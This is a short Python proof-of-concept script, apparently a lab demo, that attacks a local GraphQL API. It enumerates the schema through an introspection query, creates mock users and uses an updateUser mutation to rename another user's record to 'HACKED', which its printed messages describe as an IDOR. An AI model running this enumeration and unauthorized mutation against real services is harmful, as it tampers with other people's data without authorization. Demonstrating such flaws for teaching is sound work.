import requests
import json, time

GRAPHQL_URL = "http://127.0.0.1:8000"


def introspect_schema():
    introspection_query = '''
    query IntrospectionQuery {
      __schema {
        queryType {
          name
          fields {
            name
            args {
              name
              type {
                name
                kind
                ofType {
                  name
                  kind
                  ofType {
                    name
                    kind
                    ofType {
                      name
                      kind
                    }
                  }
                }
              }
            }
            type {
              name
              kind
              ofType {
                name
                kind
                ofType {
                  name
                  kind
                  ofType {
                    name
                    kind
                  }
                }
              }
            }
          }
        }
        mutationType {
          name
          fields {
            name
            args {
              name
              type {
                name
                kind
                ofType {
                  name
                  kind
                  ofType {
                    name
                    kind
                    ofType {
                      name
                      kind
                    }
                  }
                }
              }
            }
            type {
              name
              kind
              ofType {
                name
                kind
                ofType {
                  name
                  kind
                  ofType {
                    name
                    kind
                  }
                }
              }
            }
          }
        }
      }
    }
    '''
    response = requests.post(GRAPHQL_URL, json={'query': introspection_query})
    schema_info = response.json()

    def get_nested_type(type_obj):
        while 'ofType' in type_obj and type_obj['ofType'] is not None:
            type_obj = type_obj['ofType']
        return type_obj['name'] if 'name' in type_obj else None

    queries = schema_info['data']['__schema']['queryType']['fields']
    mutations = schema_info['data']['__schema']['mutationType']['fields']

    processed_info = {
        'queries': [
            {
                'name': field['name'],
                'args': [
                    {'name': arg['name'], 'type': get_nested_type(arg['type'])}
                    for arg in field['args']
                ],
                'returnType': get_nested_type(field['type'])
            } for field in queries
        ],
        'mutations': [
            {
                'name': field['name'],
                'args': [
                    {'name': arg['name'], 'type': get_nested_type(arg['type'])}
                    for arg in field['args']
                ],
                'returnType': get_nested_type(field['type'])
            } for field in mutations
        ]
    }

    print(json.dumps(processed_info, indent=4))


def create_user(name, age):
    query = '''
        mutation CreateUser($name: String!, $age: Int!) {
            createUser(name: $name, age: $age) {
                id
                name
                age
            }
        }
    '''
    variables = {"name": name, "age": age}
    response = requests.post(GRAPHQL_URL, json={'query': query, 'variables': variables})
    return response.json()

def get_all_users():
    query = '''
    {
      getAllUsers {
        id
        name
        age
      }
    }
    '''
    response = requests.post(GRAPHQL_URL, json={'query': query})
    return response.json()

def update_user(user_id, new_name):
    query = '''
        mutation UpdateUser($id: ID!, $name: String!) {
            updateUser(id: $id, name: $name) {
                id
                name
            }
        }
    '''
    variables = {"id": user_id, "name": new_name}
    response = requests.post(GRAPHQL_URL, json={'query': query, 'variables': variables})
    return response.json()


print("[+] This PoC is to show ho to Hack GrapQL API's")
print("[+] First enumaration!")
time.sleep(5)
introspect_schema()


print("[+] Now Creating Mock Users")
print("[+] Creating User: Alice")
create_user("Alice", 30)
print("[+] Creating User: Bob")
create_user("Bob", 25)

print("[+] Fetching all users to find Bob's ID...")
users = get_all_users()
bob_id = None
for user in users['data']['getAllUsers']:
    if user['name'] == 'Bob':
        bob_id = user['id']
        break

if bob_id:
    print(f"[+] Updating Bob's name to 'HACKED' using ID {bob_id}...")
    update_result = update_user(bob_id, "HACKED")
    print(json.dumps(update_result, indent=4))
else:
    print("[+] Bob not found!")



print(json.dumps(get_all_users(), indent=4)) 
print("[+] ^ Above you can see we preformed IDOR and changed Bob name to Hacked ^")

